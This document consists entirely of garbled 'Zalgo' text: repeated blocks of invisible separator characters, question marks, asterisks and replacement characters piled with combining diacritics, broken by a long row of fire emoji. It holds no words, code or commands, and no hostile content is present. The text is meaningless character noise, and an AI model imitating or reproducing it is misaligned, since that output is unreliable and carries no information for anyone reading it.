⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙͐̂̈̈́̀͌̀͌̒̉͝